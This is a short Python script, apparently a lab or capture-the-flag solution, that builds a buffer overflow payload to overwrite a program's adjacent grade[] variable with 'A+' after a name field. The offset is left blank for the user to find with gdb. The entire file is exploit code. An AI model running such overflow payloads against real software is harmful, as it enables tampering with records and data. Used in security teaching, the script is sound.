import sys

OFFSET = None  # bytes from start of name[] to start of grade[] — get via gdb: disas _main

payload = b"rishic"
payload += b"\x00"
payload += b"A" * (OFFSET - len(b"rishic") - 1)
payload += b"A+"
payload += b"\x00"

sys.stdout.buffer.write(payload)